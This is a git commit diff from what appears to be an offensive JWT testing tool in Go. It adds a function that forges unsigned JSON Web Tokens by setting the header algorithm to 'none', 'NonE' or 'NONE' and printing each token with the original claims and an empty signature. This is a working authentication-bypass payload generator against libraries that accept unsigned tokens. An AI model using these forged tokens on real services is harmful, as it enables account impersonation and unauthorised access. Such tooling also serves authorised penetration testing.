6f525a00ca52b9c9c5fe7ba8b065d8fb044a92e4
krishpranav <krisna.pranav@gmail.com>
2021-07-15 19:11:01 +0530

    pkg: generate new payloads

--- pkg/payload/payload.go
+++ pkg/payload/payload.go
@@ -17,3 +17,25 @@ func GenerateAllPayloads(token *jwt.Token) {
 	GenerateNonePayloads(token.Raw)
 	GenerateUrlPayloads(token.Raw)
 }
+
+func GenerateNonePayloads(token string) {
+	tokens := strings.Split(token, ".")
+	claims := tokens[1]
+	var pattern = []string{
+		"none",
+		"NonE",
+		"NONE",
+	}
+
+	for k, v := range pattern {
+		_ = k
+		header := "{\"alg\":\"" + v + "\",\"typ\":\"JWT\"}"
+		baseHeader := b64.StdEncoding.EncodeToString([]byte(header))
+		log.WithFields(logrus.Fields{
+			"payload": v,
+			"header":  header,
+		}).Info("Generate " + v + " payload")
+		fmt.Println(baseHeader + "." + claims + ".")
+	}
+
+}
